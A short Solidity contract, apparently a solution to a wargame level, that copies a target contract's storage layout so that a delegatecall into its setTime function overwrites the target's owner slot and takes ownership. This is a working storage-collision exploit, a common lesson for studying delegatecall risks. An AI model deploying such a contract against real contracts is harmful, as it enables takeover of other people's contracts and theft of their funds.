// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackingPerservation {
    // to do match the state vars of the target contract. naming can be whatever
    address public timeZone1Library; //* SLOT 0
    address public timeZone2Library; //* SLOT 1
    address public owner; //* SLOT 2
    uint storedTime; //* SLOT 3

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
